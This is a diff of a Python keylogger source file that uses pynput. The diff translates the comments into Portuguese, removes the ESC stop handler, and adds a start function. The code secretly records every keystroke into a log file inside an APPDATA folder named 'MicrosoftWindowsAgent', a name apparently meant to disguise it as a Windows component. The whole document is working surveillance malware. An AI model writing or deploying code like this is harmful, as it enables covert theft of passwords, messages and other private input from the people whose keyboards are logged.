@@ -1,22 +1,25 @@
 from pynput.keyboard import Key, Listener
 from os import getenv, path, makedirs
 
-# Directory and file for saving the log
+# Diretório e arquivo para salvar o log
 file_local_save = getenv('APPDATA')
 log_dir = path.join(file_local_save, "MicrosoftWindowsAgent")
 log_file = path.join(log_dir, "log000.txt")
 
-# Create directory if it doesn't exist
+# Cria o diretório, se não existir
 if not path.exists(log_dir):
     makedirs(log_dir)
 
-# Log function to write keys
+
 def on_press(key):
+    """
+    Função chamada ao pressionar uma tecla.
+    """
     try:
         with open(log_file, "a") as log:
             try:
                 log.write(f"{key.char}")
-            except AttributeError:  # Handle special keys
+            except AttributeError:  # Trata teclas especiais
                 if key == Key.space:
                     log.write(" ")
                 elif key == Key.enter:
@@ -24,14 +27,16 @@ def on_press(key):
                 else:
                     log.write(f"\n<{key}>\n")
     except Exception as e:
-        print(f"Error writing to log file: {e}")
+        print(f"Erro ao escrever no arquivo de log: {e}")
 
-# Stop log when ESC is pressed (uncomment if needed)
-'''
-def on_release(key):
-    if key == Key.esc:
-        return False
-'''
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def start_keylogger():
+    """
+    Inicia o keylogger.
+    """
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    start_keylogger()
